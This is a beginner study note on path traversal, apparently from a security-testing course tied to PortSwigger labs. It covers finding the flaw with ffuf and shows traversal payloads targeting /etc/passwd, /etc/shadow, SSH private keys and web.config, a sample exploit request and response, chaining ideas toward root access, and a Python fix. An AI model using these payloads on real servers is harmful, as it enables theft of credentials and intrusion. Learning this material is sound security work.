---
tags: [vapt, path-traversal, beginner]
difficulty: beginner
module: "23 - Path Traversal and LFI/RFI"
topic: "23.01 What is Path Traversal?"
portswigger_labs: ["File path traversal, simple case"]
---

# 23.01 — What is Path Traversal?

## What is it?
Path Traversal (also known as Directory Traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for backend systems, and sensitive operating system files.

It occurs when an application takes user input to fetch a file from the server's filesystem but fails to properly sanitize the input. An attacker can use special character sequences (most notably `../` or `..\`) to "step out" of the intended secure directory and traverse into other parts of the filesystem.

Think of the application as a strict librarian who is only supposed to fetch books from the "Public Reading" shelf. If you hand the librarian a note that says "Take two steps backward, enter the restricted vault, and bring me the master keys," and the librarian blindly follows it, that is a Path Traversal vulnerability.

## ASCII Diagram
```text
[Attacker]
   │
   │ 1. Requests: GET /loadImage?filename=../../../etc/passwd
   ▼
[Web Application]
   │
   │ 2. Expected Path: /var/www/html/images/
   │ 3. Appends Input: /var/www/html/images/../../../etc/passwd
   ▼
[Operating System (File Path Resolution)]
   │
   │ 4. Starts at: /var/www/html/images/
   │ 5. First  `../` moves to: /var/www/html/
   │ 6. Second `../` moves to: /var/www/
   │ 7. Third  `../` moves to: /var/
   │ 8. Resolves remainder: /etc/passwd
   ▼
[File System] ─── 9. Returns contents of /etc/passwd to the Application!
   │
[Web Application] ─── 10. Sends contents to Attacker!
```

## How to Find It
- **Manual steps:**
  1. Map the application and look for parameters that seem to handle file names, paths, or document IDs. 
  2. Common parameters include `file=`, `document=`, `image=`, `folder=`, `path=`, `template=`, `load=`, `read=`.
  3. Replace the benign value (e.g., `image=cat.png`) with a traversal payload targeting a known file (e.g., `../../../etc/passwd` on Linux, or `..\..\..\windows\win.ini` on Windows).
  4. Observe the response. If the application returns the contents of the file, you have a successful Path Traversal.

- **Tool commands with flags explained:**
  To quickly identify parameters using an automated scanner or fuzzer:
  ```bash
  # Use ffuf with a comprehensive path traversal wordlist
  ffuf -u "https://target.com/view.php?file=FUZZ" \
       -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
       -mc 200 -mr "root:x:0:0:"
  # -mc 200: Only show 200 OK responses
  # -mr "root:x:0:0:": Only show responses matching the standard /etc/passwd format
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Identify a vulnerable parameter (e.g., `GET /download?file=report.pdf`).
  2. Determine the target operating system (Linux vs Windows) to know which path separators (`/` vs `\`) and target files to use.
  3. Inject `../` sequences to step out of the current directory. You can usually safely add a large number of `../` sequences (e.g., 10 times) because once you hit the root directory `/`, adding more `../` simply keeps you at `/`.
  4. Append the absolute path of the target file you wish to read (e.g., `etc/passwd` or `Windows\System32\drivers\etc\hosts`).
  5. Read the sensitive information returned in the HTTP response.

- **Actual payloads:**
  **Linux Target:**
  ```text
  ../../../../../../../../../../etc/passwd
  ../../../../../../../../../../etc/shadow
  ../../../../../../../../../../home/user/.ssh/id_rsa
  ```
  **Windows Target:**
  ```text
  ..\..\..\..\..\..\..\..\..\..\windows\win.ini
  ..\..\..\..\..\..\..\..\..\..\inetpub\wwwroot\web.config
  ```

- **Real HTTP request/response examples:**
  **Vulnerable Request:**
  ```http
  GET /image?filename=../../../../../../etc/passwd HTTP/1.1
  Host: target.com
  ```
  **Server Response:**
  ```http
  HTTP/1.1 200 OK
  Content-Type: text/plain

  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...
  ```

## Real-World Example
A major enterprise software product contained an API endpoint for downloading diagnostic logs: `/api/v1/diagnostics?logFile=system.log`. A security researcher realized that the `logFile` parameter was not sanitized. By sending a request to `/api/v1/diagnostics?logFile=../../../../../etc/shadow`, the application obediently traversed up the directory tree and returned the hashed passwords of all users on the Linux server. The researcher then cracked the root password hash offline, gaining full administrative access to the server.

## How to Fix It
- **Developer remediation:**
  The most effective defense against path traversal is to avoid passing user-supplied input directly to filesystem APIs entirely. If the application needs to serve different files based on user requests, use an indirect reference map (e.g., `file_id=1` maps to `report.pdf`). 
  
  If you must use user-supplied filenames, strongly validate the input:
  1. Validate the input against a strict allowlist of permitted filenames.
  2. Normalize the path and verify that it strictly starts with the expected base directory.

- **Code snippet:**
  **Python (Secure Path Resolution):**
  ```python
  import os

  def get_safe_file(user_input_filename):
      BASE_DIR = '/var/www/html/safe_images/'
      
      # 1. Join the base directory with the user input
      target_path = os.path.join(BASE_DIR, user_input_filename)
      
      # 2. Resolve the absolute path (this resolves all ../ sequences)
      absolute_path = os.path.abspath(target_path)
      
      # 3. Ensure the resolved path strictly starts with the BASE_DIR
      if not absolute_path.startswith(BASE_DIR):
          raise PermissionError("Path Traversal attempt detected!")
          
      return absolute_path
  ```

## Chaining Opportunities
- This vuln + [[22.07 File Upload + Path Traversal]] → Attackers use Path Traversal within the `filename` parameter of a multipart upload to drop a webshell into a directory where execution is permitted.
- This vuln + [[Missing File Permissions / Sudo Privileges]] → Use path traversal to read an SSH private key (`~/.ssh/id_rsa`), log in via SSH, and check for `sudo` privileges to escalate to root.

## Related Notes
- [[23.02 Basic Path Traversal (../../../etc/passwd)]]
- [[23.03 Encoding Bypass for Path Traversal]]
- [[23.05 Local File Inclusion (LFI)]]
